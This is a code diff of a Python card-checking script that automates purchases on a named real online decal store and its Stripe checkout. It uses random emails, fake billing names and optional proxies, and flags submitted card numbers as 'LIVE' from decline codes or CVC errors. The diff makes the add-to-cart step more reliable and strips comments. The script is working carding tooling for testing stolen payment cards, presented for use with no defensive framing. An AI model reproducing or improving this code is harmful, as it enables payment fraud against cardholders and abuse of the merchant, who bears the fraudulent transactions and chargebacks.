@@ -1,4 +1,4 @@
-import requests, re, random, string, json
+import requests, re, random, string
 
 def generate_random_email(length=10):
     chars = string.ascii_lowercase + string.digits
@@ -24,34 +24,24 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
             session.proxies = {"http": proxy, "https": proxy}
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
 
-        # 1. Add to cart
-        headers1 = {
-            'authority': '1337decals.com',
-            'accept': '*/*',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://1337decals.com',
-            'referer': 'https://1337decals.com/product/buckle-up-bitches-rearview-mirror-decal-car-sticker/',
-            'x-requested-with': 'XMLHttpRequest',
-            'user-agent': ua
-        }
-        data1 = {
-            'action': 'jas_claue_popup_update_cart',
-            'product_data': '{"attributes":"{\\"attribute_pa_color\\":\\"copper\\"}","variation_id":45816,"product_id":45810,"quantity":1}',
-        }
-        r1 = session.post('https://1337decals.com/wp-admin/admin-ajax.php',
-                          params={'claucartf5': '1'}, headers=headers1, data=data1, timeout=15)
-        if not re.search(r'"success":true', r1.text):
-            return False, "Cart add failed"
-
-        # 2. Visit cart and checkout
+        # --- 1. Add to cart via direct URL (reliable) ---
+        cart_url = (
+            "https://1337decals.com/?add-to-cart=45810"
+            "&variation_id=45816"
+            "&attribute_pa_color=copper"
+        )
+        resp_cart = session.get(cart_url, headers={'User-Agent': ua}, timeout=15)
+        # WooCommerce redirects to cart after adding; just visit cart page
         session.get('https://1337decals.com/cart/', headers={'User-Agent': ua}, timeout=15)
+
+        # --- 2. Go to checkout ---
         r3 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
         create_nonce = re.search(r'name="woocommerce-process-checkout-nonce".*?value="([^"]+)"', r3.text)
         if not create_nonce:
             return False, "Checkout nonce not found"
         create_nonce = create_nonce.group(1)
 
-        # 3. Stripe payment method
+        # --- 3. Stripe payment method ---
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -75,16 +65,15 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
         r4 = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=15)
         pm = r4.json()
         if 'id' not in pm:
-            # Stripe PM creation error – check for live decline codes
             error = pm.get('error', {})
             decline_code = error.get('decline_code', '')
             msg = error.get('message', 'Unknown error')
             if decline_code in LIVE_DECLINE_CODES or "security code" in msg.lower():
-                return True, f"LIVE: {msg}"      # card is live
+                return True, f"LIVE: {msg}"
             return False, f"PM failed: {msg}"
         pm_id = pm['id']
 
-        # 4. Process checkout (AJAX)
+        # --- 4. Process checkout ---
         checkout_data = (
             f'wc_order_attribution_source_type=typein&'
             f'billing_email={email}&billing_first_name=exeee&billing_last_name=waysss&'
@@ -108,24 +97,23 @@ def check_st2(cc, mm, yy, cvv, proxy=None):
         r5 = session.post('https://1337decals.com/', params={'wc-ajax': 'checkout'},
                           headers=checkout_headers, data=checkout_data, timeout=20)
 
-        # 5. Read the AJAX response for Stripe errors
+        # Check AJAX response for Stripe errors
         try:
             ajax_data = r5.json()
             if 'error' in ajax_data:
                 return False, ajax_data['error']
-            # If the response indicates a redirect (order received), it's a success
             if 'redirect' in ajax_data and ajax_data['redirect']:
                 return True, "Payment successful"
         except:
             pass
 
-        # 6. Fallback: scrape the final checkout page
+        # --- 5. Final result page ---
         r6 = session.get('https://1337decals.com/checkout/', headers={'User-Agent': ua}, timeout=15)
         error_match = re.search(r'<ul class="woocommerce-error".*?<li>\s*(.*?)\s*<\/li>', r6.text, re.DOTALL)
         if error_match:
             error_text = error_match.group(1).strip()
             if "security code" in error_text.lower() or "cvc" in error_text.lower():
-                return True, error_text   # Live (wrong CVV)
+                return True, error_text
             return False, error_text
         if "thank you" in r6.text.lower() or "order received" in r6.text.lower():
             return True, "Payment successful"
